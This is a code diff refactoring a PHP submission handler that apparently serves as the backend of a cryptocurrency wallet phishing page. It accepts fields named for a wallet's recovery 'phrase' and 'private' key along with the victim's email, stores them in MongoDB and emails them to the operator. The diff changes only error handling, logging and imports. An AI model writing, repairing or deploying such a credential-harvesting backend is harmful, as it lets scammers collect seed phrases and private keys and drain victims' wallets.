@@ -4,7 +4,6 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/../error.log');
-require __DIR__ . '/../vendor/autoload.php';
 
 session_start([
     'cookie_secure' => true,
@@ -17,17 +16,21 @@ use Dotenv\Dotenv;
 use MongoDB\Driver\Manager;
 use MongoDB\Driver\BulkWrite;
 use MongoDB\Driver\Exception\Exception as MongoDBException;
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception as PHPMailerException;
 
 $dotenv = Dotenv::createImmutable(__DIR__);
 $dotenv->load();
+
+$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';
 
 if (!isset($_SESSION['csrf_token'])) {
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 }
 
 if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
-        // AJAX response
+    error_log("CSRF failed");
+    if ($isAjax) {
         http_response_code(403);
         echo json_encode(['error' => 'Invalid CSRF Token']);
     } else {
@@ -39,7 +42,7 @@ if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_tok
 }
 
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(405);
         echo json_encode(['error' => 'Method not allowed']);
     } else {
@@ -66,7 +69,8 @@ if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
     $email = trim($_POST['premail']);
     $data = trim($_POST['private']);
 } else {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    error_log("Invalid submission type");
+    if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid Submission']);
     } else {
@@ -78,7 +82,8 @@ if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
 }
 
 if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    error_log("Validation failed");
+    if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid Input']);
     } else {
@@ -89,7 +94,7 @@ if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTE
     exit;
 }
 if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Invalid Wallet Name']);
     } else {
@@ -100,7 +105,7 @@ if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
     exit;
 }
 if (strlen($data) > 1000) {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(400);
         echo json_encode(['error' => 'Input Too Long']);
     } else {
@@ -113,7 +118,7 @@ if (strlen($data) > 1000) {
 $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
 
 if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(429);
         echo json_encode(['error' => 'Rate Limit Exceeded']);
     } else {
@@ -127,7 +132,7 @@ $_SESSION['last_submission'] = time();
 
 if (!isset($_ENV['DB_HOST'], $_ENV['DB_NAME'], $_ENV['DB_USER'], $_ENV['DB_PASS'])) {
     error_log("Database configuration missing in " . __FILE__);
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(500);
         echo json_encode(['error' => 'Server Error']);
     } else {
@@ -156,7 +161,7 @@ try {
     }
 } catch (MongoDBException $e) {
     error_log("MongoDB error in " . __FILE__ . ": " . $e->getMessage());
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(500);
         echo json_encode(['error' => 'Database Error']);
     } else {
@@ -172,7 +177,7 @@ use PHPMailer\PHPMailer\Exception;
 
 if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
     error_log("PHPMailer not found in " . __FILE__);
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(500);
         echo json_encode(['error' => 'Submission Saved (Email unavailable)']);
     } else {
@@ -203,7 +208,7 @@ try {
     $mail->Subject = "New $submission_type Submission from $wallet";
     $mail->Body = "Wallet: $wallet\nType: $submission_type\nData: $data\nEmail: $email\nTime: " . date('Y-m-d H:i:s');
     $mail->send();
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         echo json_encode(['success' => 'Submission received and emailed']);
     } else {
         header('Content-Type: text/html; charset=UTF-8');
@@ -212,7 +217,7 @@ try {
     }
 } catch (Exception $e) {
     error_log("Email error in " . __FILE__ . ": " . $mail->ErrorInfo);
-    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+    if ($isAjax) {
         http_response_code(500);
         echo json_encode(['error' => 'Submission saved (Email failed)']);
     } else {
@@ -231,4 +236,3 @@ try {
 } catch (MongoDBException $e) {
     error_log("Cleanup error in " . __FILE__ . ": " . $e->getMessage());
 }
-?>
